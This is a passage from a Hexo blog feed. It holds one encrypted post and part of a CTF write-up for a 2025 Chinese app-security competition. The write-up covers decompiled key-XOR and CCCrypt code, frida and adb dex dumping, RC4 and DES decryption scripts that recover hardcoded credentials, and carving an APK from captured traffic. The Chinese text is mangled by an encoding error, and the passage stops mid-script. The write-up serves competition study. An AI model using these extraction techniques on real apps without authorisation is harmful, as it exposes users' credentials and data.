    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a0eeab07c55acc9874a67c08e8bf941d19d08212c5dd4348a3bd8ec38cff532e">7506edb3ceb0437d6c59fbae4fc5c0ab5878b9540d5a6086255126cd7577cca5e4620f05da7d5bf643977bcdd5616fb14aa4030e035c7d3d74e74490fc7dc1d45f63e532e2e902b9f7a07fae7bfd21cd5cba2b2ec6207d4e7dbfa25fb6676c8119bbdf62069bcb912ab74ac2905e1f7b27a84c4805f0970c637f9c422cdb88d5095e20711e40e91f5a05d79b62ddf7df4c5c276e71815de021c2a85de93323806d91717aca8fd4807b90161727ecc825ed4006b375698fee940e26154e4358d233a3b73176c3cfe9b145890a322a498c1bd20a8698b8d825ece6769c6736ba0a5641aae151e2deaf8499ba00d070b40cd07fcf163a920f47539565793e186c4ff74700ccfacf1489ba0c394693d0480b933b8e866c134a96a17f5924e9955d155c5c93c5c06cf11d67d482470ed2d76333ad467433c153835731f2a9ab482540d51eca9803e07ef010dd22fb3619baac3b489a9690b115af773ec1461d8022bea4fa3aad4fa72e3091d8568aa02b3839b764a30aea490045daf2ed291659da3cc3afb4dda01922bba770c0bb30dfdf4e571129ff435b5abc0a7d607ed984c57806cb8351bfeef0fd10c7844aaaa0d900e4395173fbcedc865b56c065133bcca2e6fbf3fa25f0848aabebe7db6151d240ce6e3ead6ca37f1e9b34fd5b4676b46ce42637ce5e8d2f568e371246639af95aa9a92f66295d322488129f6f578a9863a4325444f0c00dc36e8acf2897efccdd4e4876be63e53cf17b5b6a6df5a98daf91d43e28f296083085adf1d5644ef20da3d1ec619f523f463dc6737de50da08ddb09ca59fd099aed1dbc62603e7326640c4ed997bf5ab58be5b276a72e1bbfd33cf5a2f611eda3663fe14a4ca74a5a5738dd56c53da141c8c4f52cbec67d6b72e68194de2bfbb0793e6882b4cbd8b72c940d9c5fce85ad639e1ed23c6672b50353a4638df2ef5b677d144d827d8c4835f9380d7cf62c711f8f4c3f352832076ba1851510fba0597ced1cdbfc982f969afaa6b26ca1baf0072dfc2c3400aebfe5269fb3c6a5f0350570f6b16bac48533366758f5f08baf70804aef912de72530d8f3da52434936bf8e8cb973b8020ca9c851e90026d978cd554265b8201836183341fd7cbb4f1634f5c75fb7c1ea6c6eb4c9c9f95b9ff7560649c84f85222d39d93eb85687c4b1b0181c577653e05d789f13de78a2545b3afda7091d7e8c5048c33bfe0fd5ee566c9126499e8d8ed6f9b98ddd3df54b3d9785cd74679a922e54c62583bb30a95b3dccdbe0c1373a59feb46787717979fd4e2af749b6b8ca5e39662b6c2136c1641617e84631d45d555e2c50c093c771eb1ae27553d2ae4562ac71fa80ccb714a4e05c1717bcf296e7bcf8b29923cb0724a07e1bbebd7db77a3fb8efac5ac211bbca2bdcee59b478828252f7c9ce34fa381ef6f827609548b6db001f77a3d575569453e267808c0721beadf3089f53224990eb9f4d36246e628c6566a042ac54686798a374167027da7aad90a209b71d92ff4d9a57e9a2586b8cc5c4b3c1f3ed8a98de708dbcb9874aad2050a911e75e3a4b6d5d454929a7e2796920d055ce8539da9c669aed330f33172d8f724bd76466878d03e31991ff6ab7ac8e07072ac4b0694080a9caeb54a0a7bd617c7a2715d0c7ad5e83b37fd723a5886f5851c0d6febe0631ab66975de83b72987aff77e9875da6b2c9d6f04846030d55769e77d05445de82abe5a36af2a6621f157adb8b0faf743fe9838b437d3f6882e47d62d88c503d7bc0507f2ac3ed661300cb5afd73c4ee71b4f2dba68688cd020fd8f9dd17b6a5e98d41a31e0a66d3f3f534d1b4feec261617b0d6281b2b93b4d3b0f477e8c880abb14eb0f173b568a941800843fd999082d4ff3562744030a2c72040c5543af168e2d2fa705ebf36597bb9fe413a5f918d92141c92e4067253d31b357fddf2e43716ab75ca57bf8d3a3d22e9469251a0d2d7bfedecec6e508bd260a738c60e43afd5a8ca5f6084b6e6ed18d31ff5b0bebe4fd14307e2774f7eef7409b54660045bc256e0cf49d9ec3a80df3797c7567dd426d79c29f873dd18698785fecb50d862590a70ad94e5141f1a6407a13ea7b3cefc484e8ba463da024614c510e0e6794a19f4413b85da4264e145f9070ae3e54f42a09ff6bb8e1cdedf3f64267d164e8c3344762f7397ac63cbdde3fea09f8175a92126c655c7cd30c2c9790a0b6b1aea8087b6ec7cd69da952090cddb3ded070d9527dbec074ae5049f65c05fa9a5127a7c36a7e10c75a50ffad9f55460e84930547d6e8310c5f35c661dd22c22e8f0a1ebca9687e815ddd4259f576d9b46618fb9db40024f55203b9c71286a5ac6a7642767bb9f68d9d9855785113173927ebe770758cb226364fb56751e5234c42f9f215f4720df491f3b43723d03dede6d675a6c91b4f73e626eb107ae66a8f8218592010941e1e41052880be88379a985060a5f0b472528f31a17a26df96f35513add7dc8e16620d48fcccd435d7952f6da73f5e9ce998c85410b22d8626ee71ee1772bcddeb7da19cdebd4364bb76cf27631ac74bb8e2f551fda6c1572039747020555dce8824eb767a675b47628f8d9b65a465011b8c0fef6726cc33d4b8757c5e070cc01c27630b50dab4e43a8efa506b885c1ed31d0df10dd903d3f1a212b4ee57a22237de71a28053a507d3cfea69be2ce4ddd43425e679f691acf8bd5942ee40197d65afe</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025æ•°å­—ä¸­å›½APPèµ›é“å®‰å…¨ç§¯åˆ†äº‰å¤ºèµ›å†³èµ›éƒ¨åˆ†wp</title>
    <link href="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="æ•°æ®åŠ å¯†"><a href="#æ•°æ®åŠ å¯†" class="headerlink" title="æ•°æ®åŠ å¯†"></a>æ•°æ®åŠ å¯†</h1><h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>æ‰¾åˆ°å…³é”®å‡½æ•°ï¼Œå› ä¸ºä¸çŸ¥é“CCCrypt(0, 0, 1uå¯¹åº”ä»€ä¹ˆç®—æ³•ï¼Œå¾—åˆ°æ­£ç¡®çš„keyå’Œivåå°è¯•è§£å¯†</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">__int64</span> <span class="hljs-symbol">__fastcall</span> verify_system_password(const void *a1)<br>&#123;<br>  <span class="hljs-symbol">_BYTE</span> v2[<span class="hljs-number">4</span>]; // [xsp+<span class="hljs-number">20</span>h] [xbp<span class="hljs-number">-90</span>h] <span class="hljs-symbol">BYREF</span><br>  <span class="hljs-symbol">__int64</span> *v3; // [xsp+<span class="hljs-number">28</span>h] [xbp<span class="hljs-number">-88</span>h]<br>  <span class="hljs-symbol">_BYTE</span> *dataOut; // [xsp+<span class="hljs-number">30</span>h] [xbp<span class="hljs-number">-80</span>h]<br>  int v5; // [xsp+<span class="hljs-number">3</span><span class="hljs-symbol">Ch</span>] [xbp<span class="hljs-number">-74</span>h]<br>  int i; // [xsp+<span class="hljs-number">44</span>h] [xbp<span class="hljs-number">-6</span><span class="hljs-symbol">Ch</span>]<br>  const char *v8; // [xsp+<span class="hljs-number">48</span>h] [xbp<span class="hljs-number">-68</span>h]<br>  size_t dataOutMoved[<span class="hljs-number">3</span>]; // [xsp+<span class="hljs-number">50</span>h] [xbp<span class="hljs-number">-60</span>h] <span class="hljs-symbol">BYREF</span><br>  size_t dataOutAvailable; // [xsp+<span class="hljs-number">68</span>h] [xbp<span class="hljs-number">-48</span>h]<br>  size_t v11; // [xsp+<span class="hljs-number">70</span>h] [xbp<span class="hljs-number">-40</span>h]<br>  const void *v12; // [xsp+<span class="hljs-number">78</span>h] [xbp<span class="hljs-number">-38</span>h]<br>  unsigned int v13; // [xsp+<span class="hljs-number">84</span>h] [xbp<span class="hljs-number">-2</span><span class="hljs-symbol">Ch</span>]<br>  char iv[<span class="hljs-number">16</span>]; // [xsp+<span class="hljs-number">88</span>h] [xbp<span class="hljs-number">-28</span>h] <span class="hljs-symbol">BYREF</span><br>  char key[<span class="hljs-number">16</span>]; // [xsp+<span class="hljs-number">98</span>h] [xbp<span class="hljs-number">-18</span>h] <span class="hljs-symbol">BYREF</span><br><br>  v3 = &amp;qword_1000140B0;<br>  v12 = a1;<br>  ++qword_1000140B0;<br>  v11 = strlen((const char *)a1);<br>  dataOutAvailable = (v11 + <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span><span class="hljs-symbol">LL</span>;<br>  dataOutMoved[<span class="hljs-number">2</span>] = (size_t)v2;<br>  dataOut = &amp;v2[-((dataOutAvailable + <span class="hljs-number">15</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span><span class="hljs-symbol">LL</span>)];<br>  dataOutMoved[<span class="hljs-number">1</span>] = dataOutAvailable;<br>  dataOutMoved[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><span class="hljs-symbol">LL</span>;<br>  v8 = <span class="hljs-string">&quot;1234561234561234&quot;</span>;<br>  for ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i )<br>  &#123;<br>    ++v3[<span class="hljs-number">1</span>];<br>    key[i] = encrypted_system_key[i] ^ v8[i];<br>    iv[i] = encrypted_system_iv[i] ^ v8[i];<br>  &#125;<br>  print_crypto_info();<br>  if ( <span class="hljs-symbol">CCCrypt</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>u, key, <span class="hljs-number">0x10</span>uLL, iv, v12, v11, dataOut, dataOutAvailable, dataOutMoved) )<br>  &#123;<br>    ++v3[<span class="hljs-number">2</span>];<br>    v13 = <span class="hljs-number">0</span>;<br>    v5 = <span class="hljs-number">1</span>;<br>  &#125;<br>  else<br>  &#123;<br>    if ( dataOutMoved[<span class="hljs-number">0</span>] == <span class="hljs-number">16</span> )<br>    &#123;<br>      <span class="hljs-symbol">LOBYTE</span>(v13) = memcmp(dataOut, &amp;encrypted_system_password, <span class="hljs-number">0x10</span>uLL) == <span class="hljs-number">0</span>;<br>      v13 = (unsigned <span class="hljs-symbol">__int8</span>)v13;<br>    &#125;<br>    else<br>    &#123;<br>      ++v3[<span class="hljs-number">3</span>];<br>      v13 = <span class="hljs-number">0</span>;<br>    &#125;<br>    v5 = <span class="hljs-number">1</span>;<br>  &#125;<br>  return v13;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20250419164339691.png" class="" title="image-20250419164339691"><h1 id="é€†å‘å·¥ç¨‹"><a href="#é€†å‘å·¥ç¨‹" class="headerlink" title="é€†å‘å·¥ç¨‹"></a>é€†å‘å·¥ç¨‹</h1><h2 id="task-get-vip-1"><a href="#task-get-vip-1" class="headerlink" title="task_get_vip-1"></a>task_get_vip-1</h2><p>é¢˜ç›®è¦æ±‚æ˜¯è·å–vipè´¦å¯†</p><p>ä¼šè§£å¯†ç”Ÿæˆdex</p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745722987186-fd4c2ec0-9ef7-48c0-9a46-43802970b2aa.png" class="" title="img"><p>å…ˆç”¨<code>adb shell pm list packages</code>å¾—åˆ°çœŸæ­£çš„åŒ…åcom.example.wyyï¼Œè€Œä¸æ˜¯ç›´æ¥æ˜¾ç¤ºçš„cn.yongye.stub</p><p>ç”¨frida dumpå¾—åˆ°è§£å¯†åçš„dex</p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745723762216-55a48603-e0eb-4e7c-a136-1a408b062bde.png" class="" title="img"><p>æˆ–è€…è¿è¡Œåå¯ä»¥åœ¨ &#x2F;data&#x2F;user&#x2F;0&#x2F;com.example.wyy&#x2F;files&#x2F;yongye.dex æ‰¾åˆ°é‡Šæ”¾çš„ dex</p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1749395395409-75b6ae39-4cf0-43aa-8e2c-3b1333ce23ec.png" class="" title="img"><p>æœç´¢å…³é”®è¯ä¼šå‘˜</p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745722958990-30e03f24-2b01-45d2-a779-81b648e139a9.png" class="" title="img"><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745722942773-9cf502da-1438-48ba-a41d-4f53d3d00216.png" class="" title="img"><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745723514852-2e7792c3-2f11-46cd-86e4-0853db37a816.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br>a=[<span class="hljs-number">79</span>, -<span class="hljs-number">46</span>, <span class="hljs-number">102</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">14</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">63</span>, <span class="hljs-number">54</span>, -<span class="hljs-number">104</span>, <span class="hljs-number">78</span>, <span class="hljs-number">93</span>, -<span class="hljs-number">97</span>, -<span class="hljs-number">124</span>, -<span class="hljs-number">83</span>, -<span class="hljs-number">108</span>, <span class="hljs-number">45</span>, -<span class="hljs-number">81</span>, <span class="hljs-number">112</span>, -<span class="hljs-number">46</span>, -<span class="hljs-number">119</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> a[i]&lt;<span class="hljs-number">0</span>:<br>        a[i]%=<span class="hljs-number">255</span><br>data = <span class="hljs-built_in">bytes</span>(a)<br>key = <span class="hljs-string">b&#x27;92e3b9&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><span class="hljs-comment">#b&#x27;qjaidlhlf15621149463&#x27;</span><br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šsoå±‚ä¹Ÿèƒ½æŒ‡å‘è¿™ä¸ªç±»</p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745738393241-49c71045-83f0-45d2-921a-b2b110e28305.png" class="" title="img"><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745738504030-cd726eef-7d66-465d-bf47-412a4afc1512.png" class="" title="img"><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745738487283-dcc83464-eea3-47bc-936f-a9b17350c942.png" class="" title="img"><h1 id="éšç§åˆè§„"><a href="#éšç§åˆè§„" class="headerlink" title="éšç§åˆè§„"></a>éšç§åˆè§„</h1><h2 id="TaskPrivate-1"><a href="#TaskPrivate-1" class="headerlink" title="TaskPrivate(1)"></a>TaskPrivate(1)</h2><p><strong>å‘ç°deså’Œbase64</strong></p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/wps1.jpg" class="" title="img"> <p><strong>åªæ‰¾åˆ°äº†keyï¼ŒçŒœæµ‹keyå’Œivæ˜¯ä¸€æ ·çš„</strong></p><p><strong>å¯†æ–‡å…ˆfrom hexå†è§£base64ï¼Œæœ€ådesè§£å¯†</strong></p><p>**MD5{é“¶è¡Œå¡+å¯†ç }**<strong>åæäº¤</strong></p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/wps2.jpg" class="" title="img"> <h2 id="TaskPrivate-2"><a href="#TaskPrivate-2" class="headerlink" title="TaskPrivate(2)"></a>TaskPrivate(2)</h2><p><strong>MainActivityé‡Œæ‰¾åˆ°ç”³è¯·è¯»å–çŸ­ä¿¡å’Œæ‰“ç”µè¯çš„æƒé™</strong> </p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/wps3.jpg" class="" title="img"> <img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/wps4.jpg" class="" title="img"> <p><strong>md5åå¾—åˆ°flag</strong> </p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/wps5.jpg" class="" title="img"><h1 id="é€šä¿¡å®‰å…¨"><a href="#é€šä¿¡å®‰å…¨" class="headerlink" title="é€šä¿¡å®‰å…¨"></a>é€šä¿¡å®‰å…¨</h1><h2 id="ezapk-1"><a href="#ezapk-1" class="headerlink" title="ezapk-1"></a>ezapk-1</h2><p>æ ¹æ®åè®®åˆ†çº§é‡ç‚¹å…³æ³¨httpï¼Œå‘ç°åœ¨è·å–apk</p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745737442830-58573011-675c-4f5b-a091-e417c3bc65a6.png" class="" title="img"><p>è¿½è¸ªtcpå‘ç°æœ‰apkï¼Œè¿™é‡Œæå–åŸå§‹æ•°æ®æœ‰ä¸ªæ–¹ä¾¿çš„ç‚¹æ˜¯ç›´æ¥å…¨é€‰ç„¶åæŠŠä¸Šé¢ä¸€éƒ¨åˆ†åˆ æ‰ï¼Œæ‰‹åŠ¨å¤åˆ¶æ¯”è¾ƒè´¹æ—¶é—´</p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745737492221-e5800364-4d6b-49fe-a751-8357517c2d71.png" class="" title="img"><p>æŠŠä¸å¯è§å­—ç¬¦åˆ å»åä»æµé‡åŒ…é‡Œæå–å‡ºapk</p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745135272646-ba4e4340-8f31-44cf-a3fb-a213af2d87b4.png" class="" title="img"><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745737621927-2fad5f32-f438-4101-b486-0bcf4f9776bf.png" class="" title="img"><p>sç›’åˆå§‹åŒ–ï¼Œé­”æ”¹ç‚¹æ˜¯sç›’ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯1ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€å¼€å§‹è¦åŠ 1ï¼Œè¿™ä¸ªç‚¹æ¯”èµ›çš„æ—¶å€™å’‹éƒ½æ²¡æƒ³åˆ°</p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745738161899-abeb8595-c731-46df-a914-25baafc97a05.png" class="" title="img"><p>åé¢å°±æ˜¯æ­£å¸¸é€»è¾‘</p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/1745738245846-6b711d5f-bd6e-40b0-9639-4dbab3b51f1f.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        S.append((i+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span>)<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0xAF</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xC8</span>,<span class="hljs-number">0xF8</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xFD</span>, <span 